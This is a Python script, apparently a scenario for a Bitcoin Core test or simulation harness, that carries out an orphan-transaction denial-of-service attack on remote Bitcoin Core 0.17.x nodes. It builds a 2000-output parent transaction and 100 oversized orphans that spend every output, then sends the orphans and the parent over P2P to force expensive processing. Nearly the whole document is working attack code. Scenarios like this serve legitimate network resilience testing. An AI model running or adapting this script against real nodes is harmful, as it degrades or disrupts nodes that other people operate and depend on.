#!/usr/bin/env python3
import time
from decimal import Decimal

from commander import Commander

from test_framework.messages import COutPoint, CTransaction, CTxIn, CTxOut, msg_tx
from test_framework.p2p import P2PInterface
from test_framework.script import OP_TRUE, CScript

def cli_help():
    return "Run Orphan Transaction DoS scenario on remote Bitcoin Core 0.17.x nodes"

class OrphanTxDoSTest(Commander):
    def set_test_params(self):
        self.num_nodes = 1
        self.num_orphans = 100  # Maximum number of orphans
        self.num_outputs = 2000  # Number of outputs in the parent transaction

    def run_test(self):
        self.log.info("Testing node 0 for orphan transaction handling")
        test_node = self.nodes[0]
        test_wallet = self.ensure_miner(test_node)
        
        # Generate some blocks to ensure we have spendable outputs
        address = test_wallet.getnewaddress()
        self.generatetoaddress(test_node, 101, address, sync_fun=self.no_op)
        
        # Create a valid parent transaction
        parent_tx = self.create_parent_transaction(test_wallet)
        orphan_txs = self.create_orphan_txs(parent_tx)

        # Setup P2P connection
        p2p = test_node.add_p2p_connection(P2PInterface(), dstaddr=test_node.rpchost, dstport=18444)

        self.send_orphan_txs(p2p, orphan_txs)
        self.send_parent_tx(p2p, parent_tx)

    def create_parent_transaction(self, wallet):
        self.log.info("Creating parent transaction")
        inputs = wallet.listunspent()
        if not inputs:
            raise RuntimeError("No spendable outputs found")

        parent_tx = CTransaction()
        total_amount = Decimal("0")
        for inp in inputs:
            if total_amount >= self.num_outputs:
                break
            parent_tx.vin.append(CTxIn(COutPoint(int(inp["txid"], 16), inp["vout"])))
            total_amount += Decimal(str(inp["amount"]))

        fee = Decimal("0.0001")
        output_value = int((total_amount - fee) * Decimal("100000000") / self.num_outputs)
        for _ in range(self.num_outputs):
            parent_tx.vout.append(CTxOut(output_value, CScript([OP_TRUE])))

        parent_tx.rehash()
        return parent_tx

    # To calculate the size of the orphan transactions each orphan transaction has:
    #    - 2000 inputs from the parent transaction
    #    - 1 unique input
    #    - 1 output

    # 1. Fixed overhead: 4 + 3 + 1 + 4 = 12 bytes
    # 2. Inputs: (36 + 1 + 0 + 4) * 2001 = 82,041 bytes
    # 3. Output: 8 + 1 + 1 = 10 bytes

    # So, each orphan transaction in this case is 12 + 82,041 + 10 = 82,063 bytes â‰ˆ 80.1 KB.

    # When the parent transaction arrives, processing these orphans would involve checking a large number of inputs (2001) for each of the 100 orphans.

    def create_orphan_txs(self, parent_tx):
        orphan_txs = []
        for i in range(self.num_orphans):
            tx = CTransaction()
            # Reference all outputs from the parent transaction
            for j in range(self.num_outputs):
                tx.vin.append(CTxIn(COutPoint(parent_tx.sha256, j)))
            # Add a unique input to make each orphan distinct
            tx.vin.append(CTxIn(COutPoint(int('f' * 64, 16), i)))
            # Add an output
            tx.vout.append(CTxOut(1000, CScript([OP_TRUE])))
            tx.rehash()
            orphan_txs.append(tx)
            self.log.info(f"Created orphan {i} with {len(tx.vin)} inputs")
        return orphan_txs

    def send_orphan_txs(self, p2p, orphan_txs):
        self.log.info(f"Sending {len(orphan_txs)} orphan transactions")
        start_time = time.time()
        for i, tx in enumerate(orphan_txs):
            p2p.send_message(msg_tx(tx))
            if i % 10 == 0:
                elapsed_time = time.time() - start_time
                self.log.info(f"Sent {i+1} orphan transactions in {elapsed_time:.2f} seconds")
        total_time = time.time() - start_time
        self.log.info(f"Finished sending orphan transactions in {total_time:.2f} seconds")

    def send_parent_tx(self, p2p, parent_tx):
        self.log.info("Sending parent transaction")
        p2p.send_message(msg_tx(parent_tx))
        self.log.info("Parent transaction sent")

if __name__ == "__main__":
    OrphanTxDoSTest().main()
